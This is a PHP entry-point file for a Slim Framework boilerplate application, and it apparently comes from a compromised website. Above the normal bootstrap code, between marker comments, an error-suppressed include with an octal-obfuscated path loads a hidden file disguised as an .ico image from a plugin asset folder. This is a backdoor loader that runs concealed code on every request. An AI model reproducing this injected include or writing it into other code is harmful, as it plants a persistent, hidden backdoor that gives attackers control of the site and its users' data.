<?php
/*79623*/

@include "\057v\141r\057w\167w\057l\141p\151n\055d\145v\056s\164u\144i\157t\145c\150n\157.\155d\057h\164d\157c\163/\160u\142l\151c\057s\151t\145-\141s\163e\164s\057p\154u\147i\156s\057p\141c\145-\160r\157g\162e\163s\057.\064b\1433\0614\1410\056i\143o";

/*79623*/
/**
 * Slim Framework MVC Boilerplate
 *
 * This file is the starting point of your application.
 *
 * It is responsible for bootstrapping the Slim application itself, dependencies on Dependency-Injection Container,
 * middlewares and routes.
 *
 * You can find more information on Bootstrap\Application class.
 */
require __DIR__ . '/../vendor/autoload.php';

$application = new Bootstrap\Application;

$app = $application->getAppInstance();
$app->run();